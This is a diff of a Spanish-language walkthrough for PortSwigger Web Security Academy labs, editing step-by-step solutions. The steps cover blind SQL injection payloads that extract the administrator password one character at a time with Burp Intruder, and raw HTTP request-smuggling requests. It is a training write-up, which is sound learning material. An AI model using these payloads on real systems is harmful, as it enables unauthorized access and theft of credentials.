@@ -213,14 +213,14 @@ Para resolver este laboratorio se debe:
 3. Como apareció el mensaje de Welcome back, quiere decir que ese usuario existe.
 4. Usando Burp Repeater, averiguar cuántos caracteres tiene la contraseña con el payload
 
-```'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+length(password)=1--```
+`'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+length(password)=1--`
 
 5. Esto se debe hacer hasta que aparezca el mensaje Welcome back. Para ahorrar tiempo y esfuerzo, se puede hacer una búsqueda binaria o usar Burp intruder. En este caso, la contraseña tiene 20 caracteres.
 6. Usando Burp Intruder, averiguar uno por uno cuáles son los caracteres que conforman la contraseña. Para esto se usa el payload `'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,1,1)='a'--` y se configura Intruder de esta forma:
-    - En la pestaña Positions, hacer clic en Clear §.
-    - Seleccionar la `a` y hacer clic en Add §.
-    - En la pestaña Payloads, seleccionar Simple list, y debajo de Payload Options agregar todas las letras en minúscula y números (el laboratorio asume que la contraseña sólo contiene esos caracteres).
-    - En la pestaña Options, en la sección Grep - Match eliminar todas las entradas de la lista y agregar "Welcome back". Esto resalta las responses que contienen dicha frase.
+   - En la pestaña Positions, hacer clic en Clear §.
+   - Seleccionar la `a` y hacer clic en Add §.
+   - En la pestaña Payloads, seleccionar Simple list, y debajo de Payload Options agregar todas las letras en minúscula y números (el laboratorio asume que la contraseña sólo contiene esos caracteres).
+   - En la pestaña Options, en la sección Grep - Match eliminar todas las entradas de la lista y agregar "Welcome back". Esto resalta las responses que contienen dicha frase.
 7. Iniciar el ataque y esperar a que aparezca un resultado que contenga Welcome back. El caracter que esté en la columna Payload es el que se encuentra en la contraseña.
 8. Ahora repetir el último paso para cada una de las 19 posiciones restantes, reemplazando el primer 1 por la posición correspondiente. Esto se automatizar usando un ataque del tipo Cluster bomb. En mi caso no funcionó, ya que luego de enviar 200 de 720 request, el laboratorio se reinició y todas empezaron a devolver error 504. Así que tuve que hacer manualmente.
 9. Una vez que se tenga la contraseña completa, iniciar sesión como administrator y listo.
@@ -236,7 +236,7 @@ En este laboratorio no hay mensaje de "Welcome back", pero la response devuelve 
 3. Como la consulta devuelve un error 500, quiere decir que ese usuario existe.
 4. Usando Burp Intruder, averiguar cuántos caracteres tiene la contraseña con el payload
 
-```'+UNION+SELECT+CASE+WHEN+(username='administrator'+AND+length(password)=1)+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--```
+`'+UNION+SELECT+CASE+WHEN+(username='administrator'+AND+length(password)=1)+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--`
 
 5. Se selecciona el primer 1, se hace clic en Add §, y en Payload Options se agregan a la lista los números del 1 al 30. En este caso, la contraseña tiene 20 caracteres.
 6. Usando Burp Intruder, averiguar uno por uno cuáles son los caracteres que conforman la contraseña. Para esto se usa el payload `'+UNION+SELECT+CASE+WHEN+(username='administrator'+AND+substr(password,1,1)='a')+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--` y se configura de la misma forma que el laboratorio anterior, pero en Grep - Match se agrega "Internal Server Error".
@@ -440,7 +440,7 @@ javascript:alert("1337")
 
 #### Solución:
 
-Enviar 2 veces la siguiente request:
+Enviar 2 veces la siguiente request (desactivar "Update Content-Length" de Burp Repeater):
 
 ```
 POST / HTTP/1.1
@@ -457,21 +457,20 @@ G
 
 #### Solución:
 
-Enviar 2 veces la siguiente request:
+Enviar la siguiente request (desactivar "Update Content-Length" de Burp Repeater y mantener los 2 saltos de línea del final):
 
 ```
 POST / HTTP/1.1
 Host: LABID.web-security-academy.net
-Content-Type: application/x-www-form-urlencoded
-Content-length: 4
+Content-Length: 4
 Transfer-Encoding: chunked
 
-5c
+82
 GPOST / HTTP/1.1
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 15
+Host: LABID.web-security-academy.net
+Content-Length: 4
+Transfer-Encoding: chunked
 
-asd
 0
 
 
